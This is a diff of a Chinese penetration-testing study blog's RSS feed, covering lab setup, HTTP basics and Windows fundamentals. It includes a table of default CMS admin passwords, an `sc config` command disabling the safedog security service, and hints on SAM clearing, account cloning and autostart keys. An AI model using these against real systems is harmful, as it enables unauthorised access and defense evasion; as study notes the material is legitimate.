@@ -7,30 +7,30 @@
         <generator>Hugo -- gohugo.io</generator>
         <language>zh-cn</language>
         <copyright>Winglet</copyright>
-        <lastBuildDate>Thu, 18 Jan 2024 17:02:45 +0800</lastBuildDate><atom:link href="https://blog.winglet.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/index.xml" rel="self" type="application/rss+xml" /><item>
+        <lastBuildDate>Sun, 21 Jan 2024 17:02:45 +0800</lastBuildDate><atom:link href="https://blog.winglet.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/index.xml" rel="self" type="application/rss+xml" /><item>
         <title>Craser渗透测试笔记[更新中]</title>
         <link>https://blog.winglet.com/p/craser%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E7%AC%94%E8%AE%B0%E6%9B%B4%E6%96%B0%E4%B8%AD/</link>
         <pubDate>Thu, 18 Jan 2024 17:02:45 +0800</pubDate>
         
         <guid>https://blog.winglet.com/p/craser%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E7%AC%94%E8%AE%B0%E6%9B%B4%E6%96%B0%E4%B8%AD/</guid>
-        <description>&lt;img src="https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img//img/20240121_165102.gif" alt="Featured image of post Craser渗透测试笔记[更新中]" /&gt;&lt;h2 id=&#34;一渗透基础知识&#34;&gt;一、渗透基础知识&lt;/h2&gt;
-&lt;h3 id=&#34;渗透测试介绍&#34;&gt;渗透测试介绍&lt;/h3&gt;
-&lt;p&gt;渗透测试或渗透测试是一种道德驱动的尝试，旨在测试和分析安全防御以保护这些资产和信息。渗透测试涉及使用与恶意意图相同的工具、技术和方法，并且类似于审计。&lt;/p&gt;
-&lt;h4 id=&#34;渗透测试注意事项补充&#34;&gt;渗透测试注意事项（补充）&lt;/h4&gt;
-&lt;ol&gt;
+        <description>&lt;img src="https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img//img/20240121_165102.gif" alt="Featured image of post Craser渗透测试笔记[更新中]" /&gt;&lt;h2 id=&#34;一渗透基础知识&#34;&gt;一、渗透基础知识
+&lt;/h2&gt;&lt;h3 id=&#34;渗透测试介绍&#34;&gt;渗透测试介绍
+&lt;/h3&gt;&lt;p&gt;渗透测试或渗透测试是一种道德驱动的尝试，旨在测试和分析安全防御以保护这些资产和信息。渗透测试涉及使用与恶意意图相同的工具、技术和方法，并且类似于审计。&lt;/p&gt;
+&lt;h4 id=&#34;渗透测试注意事项补充&#34;&gt;渗透测试注意事项（补充）
+&lt;/h4&gt;&lt;ol&gt;
 &lt;li&gt;不能进行恶意攻击&lt;/li&gt;
 &lt;li&gt;没有获得书面授权时，不能攻击任何目标&lt;/li&gt;
 &lt;li&gt;遵守国家安全法法规&lt;/li&gt;
 &lt;/ol&gt;
-&lt;h4 id=&#34;渗透测试流程&#34;&gt;渗透测试流程&lt;/h4&gt;
-&lt;ul&gt;
+&lt;h4 id=&#34;渗透测试流程&#34;&gt;渗透测试流程
+&lt;/h4&gt;&lt;ul&gt;
 &lt;li&gt;确定目标，信息收集&lt;/li&gt;
 &lt;li&gt;漏洞探测，漏洞验证&lt;/li&gt;
 &lt;li&gt;获取所需，信息分析&lt;/li&gt;
 &lt;li&gt;编写报告，信息整理&lt;/li&gt;
 &lt;/ul&gt;
-&lt;h4 id=&#34;安全术语了解&#34;&gt;安全术语（了解）&lt;/h4&gt;
-&lt;ol&gt;
+&lt;h4 id=&#34;安全术语了解&#34;&gt;安全术语（了解）
+&lt;/h4&gt;&lt;ol&gt;
 &lt;li&gt;脚本 (asp、php、jsp)&lt;/li&gt;
 &lt;li&gt;html (xml、js、css)&lt;/li&gt;
 &lt;li&gt;cms (B/S)&lt;/li&gt;
@@ -45,13 +45,13 @@
 &lt;li&gt;MD5/加盐 (salt)&lt;/li&gt;
 &lt;li&gt;源码打包、脱库、爆库&lt;/li&gt;
 &lt;/ol&gt;
-&lt;h3 id=&#34;httphttps协议&#34;&gt;HTTP/HTTPS协议&lt;/h3&gt;
-&lt;ul&gt;
+&lt;h3 id=&#34;httphttps协议&#34;&gt;HTTP/HTTPS协议
+&lt;/h3&gt;&lt;ul&gt;
 &lt;li&gt;HTTP: 是互联网上应用最为广泛的一种网络协议，是一个客户端和服务端请求和应答的标准(TCP)，用于从&lt;code&gt;www&lt;/code&gt;服务器传输超文本到本地浏览器的传输协议。它可以使浏览器更加高效，使网络传输减少。默认端口:80&lt;/li&gt;
 &lt;li&gt;HTTPS：是以安全为目标的HTTP通道，简单来说就是HTTP的安全版，HTTPS的安全基础是SSL，因此加密的详细内容就需要SSL。&lt;code&gt;HTTP + 加密 + 认证 + 完整性保护 = HTTPS&lt;/code&gt;。默认端口:443&lt;/li&gt;
 &lt;/ul&gt;
-&lt;h4 id=&#34;http-url&#34;&gt;HTTP URL&lt;/h4&gt;
-&lt;ul&gt;
+&lt;h4 id=&#34;http-url&#34;&gt;HTTP URL
+&lt;/h4&gt;&lt;ul&gt;
 &lt;li&gt;
 &lt;p&gt;统一资源定位符(URL时一种特殊类型的URI，包含了用于查找某个资源足够的信息)&lt;/p&gt;
 &lt;/li&gt;
@@ -60,8 +60,8 @@
 &lt;p&gt;例：http://localhost:1313/index.php&lt;/p&gt;
 &lt;/li&gt;
 &lt;/ul&gt;
-&lt;h4 id=&#34;http请求头响应头&#34;&gt;http请求头响应头&lt;/h4&gt;
-&lt;ul&gt;
+&lt;h4 id=&#34;http请求头响应头&#34;&gt;http请求头响应头
+&lt;/h4&gt;&lt;ul&gt;
 &lt;li&gt;
 &lt;p&gt;referer、x-forwarded-for、client-ip  注入漏洞、xss问题、躲避验证&lt;/p&gt;
 &lt;/li&gt;
@@ -75,8 +75,8 @@
 &lt;p&gt;jsp、tomcat 7.0.1-7&lt;/p&gt;
 &lt;/li&gt;
 &lt;/ul&gt;
-&lt;h4 id=&#34;http响应码&#34;&gt;HTTP响应码&lt;/h4&gt;
-&lt;ul&gt;
+&lt;h4 id=&#34;http响应码&#34;&gt;HTTP响应码
+&lt;/h4&gt;&lt;ul&gt;
 &lt;li&gt;200：请求成功&lt;/li&gt;
 &lt;li&gt;302：所请求的页面已经临时转移至新的URL&lt;/li&gt;
 &lt;li&gt;404：服务器无法找到被请求的页面&lt;/li&gt;
@@ -87,11 +87,11 @@
 &lt;li&gt;503：服务器当前不可用&lt;/li&gt;
 &lt;li&gt;waf拦截菜刀也可能导致50x&lt;/li&gt;
 &lt;/ul&gt;
-&lt;h3 id=&#34;安全测试环境配置&#34;&gt;安全测试环境配置&lt;/h3&gt;
-&lt;h4 id=&#34;配置虚拟机&#34;&gt;配置虚拟机&lt;/h4&gt;
-&lt;h5 id=&#34;安装wmware&#34;&gt;安装wmware&lt;/h5&gt;
-&lt;h5 id=&#34;配置虚拟机网络&#34;&gt;配置虚拟机网络&lt;/h5&gt;
-&lt;p&gt;&lt;img src=&#34;https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img//img/image-20240119111948609.png&#34;
+&lt;h3 id=&#34;安全测试环境配置&#34;&gt;安全测试环境配置
+&lt;/h3&gt;&lt;h4 id=&#34;配置虚拟机&#34;&gt;配置虚拟机
+&lt;/h4&gt;&lt;h5 id=&#34;安装wmware&#34;&gt;安装wmware
+&lt;/h5&gt;&lt;h5 id=&#34;配置虚拟机网络&#34;&gt;配置虚拟机网络
+&lt;/h5&gt;&lt;p&gt;&lt;img src=&#34;https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img//img/image-20240119111948609.png&#34;
 	
 	
 	
@@ -133,8 +133,8 @@
 	
 	
 &gt;&lt;/p&gt;
-&lt;h4 id=&#34;修改虚拟机网段&#34;&gt;修改虚拟机网段&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&#34;https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img//img/image-20240119114957637.png&#34;
+&lt;h4 id=&#34;修改虚拟机网段&#34;&gt;修改虚拟机网段
+&lt;/h4&gt;&lt;p&gt;&lt;img src=&#34;https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img//img/image-20240119114957637.png&#34;
 	
 	
 	
@@ -145,20 +145,26 @@
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;**ps:**windows系统可以通过&lt;code&gt;win+R&lt;/code&gt;并输入&lt;code&gt;uac&lt;/code&gt;来修改用户控制系统&lt;/p&gt;
-&lt;h3 id=&#34;搭建windows-server&#34;&gt;搭建windows server&lt;/h3&gt;
-&lt;p&gt;&lt;strong&gt;下载地址：&lt;/strong&gt; &lt;a class=&#34;link&#34; href=&#34;https://msdn.itellyou.cn/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+&lt;h3 id=&#34;搭建windows-server&#34;&gt;搭建windows server
+&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;下载地址：&lt;/strong&gt; &lt;a class=&#34;link&#34; href=&#34;https://msdn.itellyou.cn/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
     &gt;MSDN, 我告诉你 - 做一个安静的工具站 (itellyou.cn)&lt;/a&gt;&lt;/p&gt;
 &lt;p&gt;&lt;strong&gt;操作系统：&lt;/strong&gt; windows server 2012&lt;/p&gt;
-&lt;h4 id=&#34;搭建网站asp&#34;&gt;搭建网站(.asp)&lt;/h4&gt;
-&lt;p&gt;当服务器搭建多个站（旁站）&lt;/p&gt;
+&lt;h4 id=&#34;搭建网站asp&#34;&gt;搭建网站(.asp)
+&lt;/h4&gt;&lt;p&gt;当服务器搭建多个站（旁站）&lt;/p&gt;
 &lt;ul&gt;
-&lt;li&gt;不同端口，ip域名都相同&lt;/li&gt;
+&lt;li&gt;不同端口，ip域名都相同             &lt;strong&gt;（端口模式）&lt;/strong&gt;&lt;/li&gt;
 &lt;li&gt;相同端口（80）IP不同，也可以&lt;/li&gt;
-&lt;li&gt;相同端口，相同ip，不同域名&lt;/li&gt;
-&lt;li&gt;目录建站&lt;/li&gt;
+&lt;li&gt;相同端口，相同ip，不同域名      &lt;strong&gt;(子域名模式)&lt;/strong&gt;&lt;/li&gt;
 &lt;/ul&gt;
-&lt;h5 id=&#34;创建角色和功能&#34;&gt;&lt;strong&gt;创建角色和功能&lt;/strong&gt;&lt;/h5&gt;
-&lt;p&gt;前面默认选择，在“服务器角色”这里选择如下&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;www.baidu.com		php程序
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;baidu.baidu.com		asp程序
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
+&lt;li&gt;目录建站                                        &lt;strong&gt;(目录模式)&lt;/strong&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;www.baidu.com
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;www.baidu.com/list
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h5 id=&#34;创建角色和功能&#34;&gt;&lt;strong&gt;创建角色和功能&lt;/strong&gt;
+&lt;/h5&gt;&lt;p&gt;前面默认选择，在“服务器角色”这里选择如下&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img//img/image-20240119125219000.png&#34;
 	
 	
@@ -191,8 +197,8 @@
 	
 	
 &gt;&lt;/p&gt;
-&lt;h5 id=&#34;部署网站&#34;&gt;部署网站&lt;/h5&gt;
-&lt;p&gt;&lt;code&gt;win+R&lt;/code&gt;并输入&lt;code&gt;inetmgr&lt;/code&gt;打开IIS控制台&lt;/p&gt;
+&lt;h5 id=&#34;部署网站&#34;&gt;部署网站
+&lt;/h5&gt;&lt;p&gt;&lt;code&gt;win+R&lt;/code&gt;并输入&lt;code&gt;inetmgr&lt;/code&gt;打开IIS控制台&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img//img/image-20240120112008110.png&#34;
 	
 	
@@ -257,8 +263,8 @@
 	
 	
 &gt;&lt;/p&gt;
-&lt;h5 id=&#34;绑定域名&#34;&gt;绑定域名&lt;/h5&gt;
-&lt;p&gt;&lt;img src=&#34;https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img//img/image-20240121145356805.png&#34;
+&lt;h5 id=&#34;绑定域名&#34;&gt;绑定域名
+&lt;/h5&gt;&lt;p&gt;&lt;img src=&#34;https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img//img/image-20240121145356805.png&#34;
 	
 	
 	
@@ -270,8 +276,8 @@
 &gt;&lt;/p&gt;
 &lt;p&gt;但是如果我们去访问&lt;code&gt;www.baidu.com&lt;/code&gt;的话，它会转到百度的页面，这里我们需要修改系统的host解析(优先级高于dns解析)，位置在&lt;code&gt;C:\Windows\System32\Drivers\etc\host&lt;/code&gt;,并在结尾出添加&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;192.168.114.138   www.baidu.com
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h5 id=&#34;判断网站是不是基于iis搭建&#34;&gt;判断网站是不是基于IIS搭建&lt;/h5&gt;
-&lt;p&gt;用搜索引擎语法&lt;code&gt;inurl=asp?id=&lt;/code&gt;&lt;/p&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h5 id=&#34;判断网站是不是基于iis搭建&#34;&gt;判断网站是不是基于IIS搭建
+&lt;/h5&gt;&lt;p&gt;用搜索引擎语法&lt;code&gt;inurl=asp?id=&lt;/code&gt;&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img//img/image-20240121151818208.png&#34;
 	
 	
@@ -282,8 +288,8 @@
 	
 	
 &gt;&lt;/p&gt;
-&lt;h4 id=&#34;搭建网站php&#34;&gt;搭建网站(.php)&lt;/h4&gt;
-&lt;p&gt;下载&lt;code&gt;phpstudy&lt;/code&gt;,选择这个版本&lt;/p&gt;
+&lt;h4 id=&#34;搭建网站php&#34;&gt;搭建网站(.php)
+&lt;/h4&gt;&lt;p&gt;下载&lt;code&gt;phpstudy&lt;/code&gt;,选择这个版本&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img//img/image-20240121153449094.png&#34;
 	
 	
@@ -305,8 +311,8 @@
 	
 	
 &gt;&lt;/p&gt;
-&lt;h5 id=&#34;配置系统处理中&#34;&gt;配置系统（处理中）&lt;/h5&gt;
-&lt;p&gt;接下来我们要配置系统，如果你发现windows 10系统没有IIS服务，可以在&lt;code&gt;控制面板-&amp;gt;程序-&amp;gt;启用或关闭windows功能&lt;/code&gt;&lt;/p&gt;
+&lt;h5 id=&#34;配置系统处理中&#34;&gt;配置系统（处理中）
+&lt;/h5&gt;&lt;p&gt;接下来我们要配置系统，如果你发现windows 10系统没有IIS服务，可以在&lt;code&gt;控制面板-&amp;gt;程序-&amp;gt;启用或关闭windows功能&lt;/code&gt;&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img//img/image-20240121153849011.png&#34;
 	
 	
@@ -328,78 +334,78 @@
 	
 	
 &gt;&lt;/p&gt;
-&lt;h3 id=&#34;课后作业&#34;&gt;课后作业&lt;/h3&gt;
-&lt;h4 id=&#34;asp&#34;&gt;.asp&lt;/h4&gt;
-&lt;table&gt;
+&lt;h3 id=&#34;课后作业&#34;&gt;课后作业
+&lt;/h3&gt;&lt;h4 id=&#34;asp&#34;&gt;.asp
+&lt;/h4&gt;&lt;table&gt;
   &lt;thead&gt;
       &lt;tr&gt;
-          &lt;th style=&#34;text-align: left&#34;&gt;cms&lt;/th&gt;
-          &lt;th style=&#34;text-align: left&#34;&gt;默认索引文件&lt;/th&gt;
-          &lt;th style=&#34;text-align: left&#34;&gt;后台登陆地址&lt;/th&gt;
-          &lt;th style=&#34;text-align: left&#34;&gt;默认账号/密码&lt;/th&gt;
+          &lt;th&gt;cms&lt;/th&gt;
+          &lt;th&gt;默认索引文件&lt;/th&gt;
+          &lt;th&gt;后台登陆地址&lt;/th&gt;
+          &lt;th&gt;默认账号/密码&lt;/th&gt;
       &lt;/tr&gt;
   &lt;/thead&gt;
   &lt;tbody&gt;
       &lt;tr&gt;
-          &lt;td style=&#34;text-align: left&#34;&gt;aspcms&lt;/td&gt;
-          &lt;td style=&#34;text-align: left&#34;&gt;index.asp&lt;/td&gt;
-          &lt;td style=&#34;text-align: left&#34;&gt;http://IP/admin_aspcms/login.asp&lt;/td&gt;
-          &lt;td style=&#34;text-align: left&#34;&gt;admin/123456&lt;/td&gt;
+          &lt;td&gt;aspcms&lt;/td&gt;
+          &lt;td&gt;index.asp&lt;/td&gt;
+          &lt;td&gt;http://IP/admin_aspcms/login.asp&lt;/td&gt;
+          &lt;td&gt;admin/123456&lt;/td&gt;
       &lt;/tr&gt;
       &lt;tr&gt;
-          &lt;td style=&#34;text-align: left&#34;&gt;southdic (南方)&lt;/td&gt;
-          &lt;td style=&#34;text-align: left&#34;&gt;Default.asp&lt;/td&gt;
-          &lt;td style=&#34;text-align: left&#34;&gt;http://IP/admin/Login.asp&lt;/td&gt;
-          &lt;td style=&#34;text-align: left&#34;&gt;admin/0791idc&lt;/td&gt;
+          &lt;td&gt;southdic (南方)&lt;/td&gt;
+          &lt;td&gt;Default.asp&lt;/td&gt;
+          &lt;td&gt;http://IP/admin/Login.asp&lt;/td&gt;
+          &lt;td&gt;admin/0791idc&lt;/td&gt;
       &lt;/tr&gt;
       &lt;tr&gt;
-          &lt;td style=&#34;text-align: left&#34;&gt;&lt;/td&gt;
-          &lt;td style=&#34;text-align: left&#34;&gt;&lt;/td&gt;
-          &lt;td style=&#34;text-align: left&#34;&gt;&lt;/td&gt;
-          &lt;td style=&#34;text-align: left&#34;&gt;&lt;/td&gt;
+          &lt;td&gt;&lt;/td&gt;
+          &lt;td&gt;&lt;/td&gt;
+          &lt;td&gt;&lt;/td&gt;
+          &lt;td&gt;&lt;/td&gt;
       &lt;/tr&gt;
   &lt;/tbody&gt;
 &lt;/table&gt;
-&lt;h4 id=&#34;php&#34;&gt;.php&lt;/h4&gt;
-&lt;table&gt;
+&lt;h4 id=&#34;php&#34;&gt;.php
+&lt;/h4&gt;&lt;table&gt;
   &lt;thead&gt;
       &lt;tr&gt;
-          &lt;th style=&#34;text-align: left&#34;&gt;cms&lt;/th&gt;
-          &lt;th style=&#34;text-align: left&#34;&gt;默认索引文件&lt;/th&gt;
-          &lt;th style=&#34;text-align: left&#34;&gt;后台登陆地址&lt;/th&gt;
-          &lt;th style=&#34;text-align: left&#34;&gt;默认账号/密码&lt;/th&gt;
+          &lt;th&gt;cms&lt;/th&gt;
+          &lt;th&gt;默认索引文件&lt;/th&gt;
+          &lt;th&gt;后台登陆地址&lt;/th&gt;
+          &lt;th&gt;默认账号/密码&lt;/th&gt;
       &lt;/tr&gt;
   &lt;/thead&gt;
   &lt;tbody&gt;
       &lt;tr&gt;
-          &lt;td style=&#34;text-align: left&#34;&gt;xdcms&lt;/td&gt;
-          &lt;td style=&#34;text-align: left&#34;&gt;index.php&lt;/td&gt;
-          &lt;td style=&#34;text-align: left&#34;&gt;http://IP/index.php?m=xdcms&amp;amp;c=login&lt;/td&gt;
-          &lt;td style=&#34;text-align: left&#34;&gt;xdcms/xdcms&lt;/td&gt;
+          &lt;td&gt;xdcms&lt;/td&gt;
+          &lt;td&gt;index.php&lt;/td&gt;
+          &lt;td&gt;http://IP/index.php?m=xdcms&amp;amp;c=login&lt;/td&gt;
+          &lt;td&gt;xdcms/xdcms&lt;/td&gt;
       &lt;/tr&gt;
       &lt;tr&gt;
-          &lt;td style=&#34;text-align: left&#34;&gt;帝国cms&lt;/td&gt;
-          &lt;td style=&#34;text-align: left&#34;&gt;index.php&lt;/td&gt;
-          &lt;td style=&#34;text-align: left&#34;&gt;http://IP/e/admin/index.php&lt;/td&gt;
-          &lt;td style=&#34;text-align: left&#34;&gt;admin/admin888&lt;/td&gt;
+          &lt;td&gt;帝国cms&lt;/td&gt;
+          &lt;td&gt;index.php&lt;/td&gt;
+          &lt;td&gt;http://IP/e/admin/index.php&lt;/td&gt;
+          &lt;td&gt;admin/admin888&lt;/td&gt;
       &lt;/tr&gt;
       &lt;tr&gt;
-          &lt;td style=&#34;text-align: left&#34;&gt;dedecms（织梦）&lt;/td&gt;
-          &lt;td style=&#34;text-align: left&#34;&gt;index.php&lt;/td&gt;
-          &lt;td style=&#34;text-align: left&#34;&gt;http://IP/dede/login.php?gotopage=%2Fdedecms%2Fdede%2F&lt;/td&gt;
-          &lt;td style=&#34;text-align: left&#34;&gt;admin/admin&lt;/td&gt;
+          &lt;td&gt;dedecms（织梦）&lt;/td&gt;
+          &lt;td&gt;index.php&lt;/td&gt;
+          &lt;td&gt;http://IP/dede/login.php?gotopage=%2Fdedecms%2Fdede%2F&lt;/td&gt;
+          &lt;td&gt;admin/admin&lt;/td&gt;
       &lt;/tr&gt;
       &lt;tr&gt;
-          &lt;td style=&#34;text-align: left&#34;&gt;phpweb&lt;/td&gt;
-          &lt;td style=&#34;text-align: left&#34;&gt;index.php&lt;/td&gt;
-          &lt;td style=&#34;text-align: left&#34;&gt;http://IP/root&lt;/td&gt;
-          &lt;td style=&#34;text-align: left&#34;&gt;admin/admin&lt;/td&gt;
+          &lt;td&gt;phpweb&lt;/td&gt;
+          &lt;td&gt;index.php&lt;/td&gt;
+          &lt;td&gt;http://IP/root&lt;/td&gt;
+          &lt;td&gt;admin/admin&lt;/td&gt;
       &lt;/tr&gt;
   &lt;/tbody&gt;
 &lt;/table&gt;
-&lt;h2 id=&#34;二windows基础&#34;&gt;二、windows基础&lt;/h2&gt;
-&lt;h3 id=&#34;系统目录&#34;&gt;系统目录&lt;/h3&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;windows -- system32     储存常用命令(如：cmd)
+&lt;h2 id=&#34;二windows基础&#34;&gt;二、windows基础
+&lt;/h2&gt;&lt;h3 id=&#34;系统目录&#34;&gt;系统目录
+&lt;/h3&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;windows -- system32     储存常用命令(如：cmd)
 &lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;				  |
 &lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;				   -- config -- sam    存储账号密码(清空可直接登录)
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
@@ -409,8 +415,8 @@
 &lt;li&gt;驱动和程序&lt;/li&gt;
 &lt;li&gt;&lt;code&gt;sc config &amp;quot;safedog center guarder&amp;quot; start=disable &lt;/code&gt; 将该服务设为禁用，重启服务后相当于关闭&lt;/li&gt;
 &lt;/ul&gt;
-&lt;h3 id=&#34;计算机端口&#34;&gt;计算机端口&lt;/h3&gt;
-&lt;ul&gt;
+&lt;h3 id=&#34;计算机端口&#34;&gt;计算机端口
+&lt;/h3&gt;&lt;ul&gt;
 &lt;li&gt;端口就是用来区分服务的&lt;/li&gt;
 &lt;li&gt;端口不可复用 (在渗透时，可以尝试将3389端口与80端口进行复用，从而访问80端口时获得远程桌面权限)&lt;/li&gt;
 &lt;li&gt;端口范围1-65535&lt;/li&gt;
@@ -418,9 +424,9 @@
 &lt;li&gt;木马病毒一般使用高位端口&lt;/li&gt;
 &lt;/ul&gt;
 &lt;p&gt;ps：http隧道技术，端口转发&lt;/p&gt;
-&lt;h3 id=&#34;常见端口及服务补充&#34;&gt;常见端口及服务（补充）&lt;/h3&gt;
-&lt;h3 id=&#34;注册表及其结构补充&#34;&gt;注册表及其结构(补充)&lt;/h3&gt;
-&lt;p&gt;打开注册表&lt;code&gt;win+R   regedit&lt;/code&gt;&lt;/p&gt;
+&lt;h3 id=&#34;常见端口及服务补充&#34;&gt;常见端口及服务（补充）
+&lt;/h3&gt;&lt;h3 id=&#34;注册表及其结构补充&#34;&gt;注册表及其结构(补充)
+&lt;/h3&gt;&lt;p&gt;打开注册表&lt;code&gt;win+R   regedit&lt;/code&gt;&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;HKEY_CLASSES_ROOT: 文件扩展名与应用的关联及OLE信息
 &lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;HKEY_CURRENT_USER: 当前用户控制面板选项和桌面等设置，以及映射的网络驱动器
 &lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;HKEY_LOCAL_MACHINE: 计算机硬件与应用程序信息
@@ -430,8 +436,8 @@
 &lt;li&gt;克隆账号&lt;code&gt;HKEY_LOCAL_MACHINE/SAM&lt;/code&gt;可以把管理员权限赋予来宾账号 &lt;strong&gt;(如何操作)&lt;/strong&gt;&lt;/li&gt;
 &lt;li&gt;开机启动项注册表&lt;code&gt;\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run&lt;/code&gt; 或&lt;code&gt;\HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run\&lt;/code&gt;&lt;/li&gt;
 &lt;/ul&gt;
-&lt;h3 id=&#34;常用dos命令&#34;&gt;常用DOS命令&lt;/h3&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;color: 这个命令用于改变命令提示符窗口的前景色和背景色。
+&lt;h3 id=&#34;常用dos命令&#34;&gt;常用DOS命令
+&lt;/h3&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;color: 这个命令用于改变命令提示符窗口的前景色和背景色。
 &lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ping: 用于测试与特定网络地址之间的连接。它发送一个网络数据包到目标地址，并等待接收响应，从而评估网络的可达性和延迟。
 &lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ipconfig: 命令用于显示计算机的网络配置信息，包括IP地址、子网掩码、默认网关和DNS服务器等。
 &lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ipconfig /release: 这个命令用于释放计算机当前使用的IP地址，这样计算机就可以申请新的IP地址。
@@ -468,11 +474,141 @@
 &lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;hostname: hostname命令用于显示计算机的主机名。
 &lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;wmic product get name, version: 这个命令使用 Windows Management Instrumentation Command-line (WMIC) 工具，用于列出安装在计算机上的软件产品的名称和版本信息。
 &lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;netstat -an: netstat命令用于显示网络连接和网络统计信息。通过添加参数&amp;#34;-an&amp;#34;，它会显示所有活动连接的详细信息，包括本地地址、远程地址、连接状态等。
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;批处理-bat&#34;&gt;批处理 (.bat)&lt;/h3&gt;
-&lt;p&gt;如果渗透的时候命令出现符号问题，可以尝试把命令放入批处理中，然后运行批处理来防止符号报错。&lt;/p&gt;
-&lt;h3 id=&#34;powershell&#34;&gt;powershell&lt;/h3&gt;
